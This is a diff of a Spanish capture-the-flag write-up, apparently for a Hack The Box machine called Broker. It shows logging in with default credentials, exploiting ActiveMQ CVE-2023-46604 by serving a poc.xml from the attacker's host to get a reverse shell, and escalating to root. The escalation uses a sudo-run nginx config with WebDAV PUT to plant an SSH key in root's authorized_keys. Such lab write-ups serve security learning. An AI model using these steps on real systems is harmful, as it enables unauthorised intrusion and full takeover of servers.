@@ -95,21 +95,34 @@ PORT      STATE SERVICE    VERSION
 ```
 ## ¿Qué es ActiveMQ?
 
-
+Es un agente de mensajería de código abierto que permite la comunicación asíncrona entre diferentes aplicaciones y sistemas. Al actuar como un intermediario de mensajes, facilita el intercambio de datos sin que los sistemas deban estar en línea al mismo tiempo, utilizando el protocolo JMS y otros estándares de la industria. Es una herramienta popular para la integración de aplicaciones empresariale
 
 ## Examinar la página
-usuario y contrase  de admin admin
 
-![alt text](image.png)
+Cuando accedemos a la página nos encontramos con un panel de login en el que hay que autenticarse para poder acceder a el. 
 
+Antes de hacer ningún ataque de fuerza bruta probamos con las credenciales habituales por lo tanto podemos acceder con las siguientes credenciales.
 
+```
+admin:admin
+```
+
+![alt text](Imagenes/Broker1.png)
+
+Una vez que accedemos buscamos credenciales o algún directorio donde podamos subir ficheros y aprender como funciona, sin embargo no encontramos nada interesante.
 
 ## Explotación e Intrusión en el sistema
+
+Buscamos si esta aplicación es vulnerable en la version que tenemos `ActiveMQ OpenWire transport 5.15.15`
+
+Encontramos este repositorio que explota una vulnerabilidad de deserialización logrando ejecución de comandos. 
 ```
 https://github.com/pulentoski/CVE-2023-46604
 ```
+Para explotarla modificamos el archivo `poc.xml` es el fichero que nos va a permitir entablarnos la `revershell`
 
-poc.xml
+poc.xml:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8" ?>
     <beans xmlns="http://www.springframework.org/schema/beans"
@@ -127,23 +140,30 @@ poc.xml
         </bean>
     </beans>
 ```
+Montamos un servidor con python para que la pagina pueda acceder al recurso por el puerto 8000
+
 ```shell
 python3 -m http.server 8000
 ``` 
-herraienta  de penelope
+
+Por otro lado nos ponemos en escucha con la herramienta `penelope` para obtener la shell con el trataiento de la TTY ya realizado para ir más rápido. Se puede acceder a ella mediante este repositorio.
 
 ```
 https://github.com/brightio/penelope
 ```
-```
+
+Ejecutamos la aplicación y por defecto se pone en el puerto 4444
+
+```shell
 penelope
 ```
+Por último ejecutamos el script para deserializar y obtener la shell
 
 ```shell
 python3 CVE-2023-46604.py -i 10.10.11.243 -u "http://10.10.14.34:8000/poc.xml"
 ```
 
-Obtnemos una revershell
+Finalmente comprobamos que todo ha funcionado y hemos obtenido una shell interactiva
 
 ```shell
 penelope        
@@ -161,6 +181,9 @@ activemq  activemq-diag  activemq.jar  env  linux-x86-32  linux-x86-64  macosx  
 
 ## Escalada de privilegios
 
+Para la escalda de privilegios ejecutamos los comandos habituales comprobamos que podemos ejecutar como usuario `activemq` y con root nos encontramos con un binaro nginx 
+
+
 ```shell
 activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
 Matching Defaults entries for activemq on broker:
@@ -169,32 +192,65 @@ Matching Defaults entries for activemq on broker:
 User activemq may run the following commands on broker:
     (ALL : ALL) NOPASSWD: /usr/sbin/nginx
 ```
+Para la escalada podemos diseñar nuestro propio `nginx.conf` para posteriormente ejecutarlo con la opcion -c
 
-```
+```shell
 cp /etc/nginx/nginx.conf /tmp/
 ```
-modificamos el fichero de la siguiente manera
 
+Modificamos el fichero de la siguiente manera:
+  - Modificamos el user para que sea `root`
+  - Modificamos el puerto en mi caso he puesto el `1236`
+  - Modificamos desde donde tiene acceso en nuestor caso desde `/` con privilegios
+  - El parámetro `autoindex on` es para que nos permita listar los directorios desde el navegador
+  - El parámetro `dav_methods PUT` es necesario para poder permitir la transferencia por Curl y el método PUT
 
-lo corremos
+```shell
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
 
+  events {
+    worker_connections 50;
+  }
+
+  http {
+    server {
+      listen 1236;
+      root /;
+      autoindex on;
+      dav_methods PUT;
+    }
+}
 ```
+
+Ejecutamos el fichero `nginx.conf` de la siguiente manera con privilegios
+
+```shell
 sudo nginx -c /tmp/nginx.conf
 ```
+Nos dirigimos al navegador y vemos que tenemos capacidad de listar los archivos con todos los permisos, sin embargo aún no tenemos acceso con una terminal con privilegios para ello al tener el puerto 22 abierto podemos orientar el acceso por la tranferencia de nuestra clave pública.
 
-```
+Para ello nos percatamos de que existe el directorio `.ssh` con el directorio de `authorized_keys` que se encuentra vacío. 
+
+```shell
 http://10.10.11.243:1236/root/.ssh/authorized_keys
 ```
 
-Para obtneer una shell con privilegios
+Para obtener la shell con privilegios generamos un par de claves para posteriomente tranferir la pública mediante `Curl`.
 
-```
+Generamos el par de claves:
+
+```shell
 ssh-keygen
 ```
+Transferimos las claves al directorio `authorized_keys` con el parametro `-d` enviamos el contenido de la clave
 
 ```
 curl -s -X PUT http://10.10.11.243:1236/root/.ssh/authorized_keys -d 'contenido_ip_publica'
 ```
+
+Finalemente si todo ha ido de manera correcta tendremos acceso con privilegios.
 
 ```shell
 ssh root@10.10.11.243
